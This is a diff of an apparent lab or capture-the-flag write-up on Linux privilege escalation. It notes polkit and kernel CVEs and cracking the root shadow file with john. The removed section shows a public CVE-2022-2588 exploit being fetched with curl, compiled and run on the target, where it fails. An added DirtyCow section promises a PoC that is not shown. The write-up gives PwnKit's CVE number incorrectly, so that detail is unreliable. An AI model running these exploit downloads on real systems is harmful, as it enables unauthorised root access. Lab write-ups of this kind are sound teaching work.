@@ -449,7 +449,7 @@ curl -L https://github.com/carlospolop/PEASSng/releases/latest/download/linpeas.
 ```
 
 - Linpeas tells us that the machine is vulnerable to CVE-2021-4043 or PwnKit - a polkit exploit
-- It also says its potentially vulnerable to CVE-2022-2588
+- It also says its potentially vulnerable to CVE-2022-2588 however after looking into the CVE it does not seem to work with the kernel the victim box is running
 - We also get the root shadow file which we can crack with john
 
 
@@ -574,29 +574,6 @@ root@srv-99-590:/var/www/html#
 ```
 
 
-### Method 4  - CVE-2022-2588 (FAILED CRASHED BOX)
-- I tried to exploit this cve however it failed as shown below
-
-```
-jennifer@srv-99-590:~$ curl https://raw.githubusercontent.com/Markakd/CVE-2022-2588/master/exp_file_credential.c > ex2.c
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-100 23935  100 23935    0     0  81581      0 --:--:-- --:--:-- --:--:-- 81411
-jennifer@srv-99-590:~$ man gcc
-jennifer@srv-99-590:~$ gcc -O0 ex2.c -lpthread -o ex2
-jennifer@srv-99-590:~$ ./ex2
-self path /home/jennifer/./ex2
-prepare done
-Old limits -> soft limit= 14096 	 hard limit= 14096
-starting exploit, num of cores: 1
-defrag done
-spray 256 done
-freed the filter object
-256 freed done
-double free done
-spraying files
-no overlap found :(...
-failed
-```
-
-
+### Method 4 - DirtyCow
+- This is a well known kernel exploit that originated back in 2016
+- Below is a PoC 
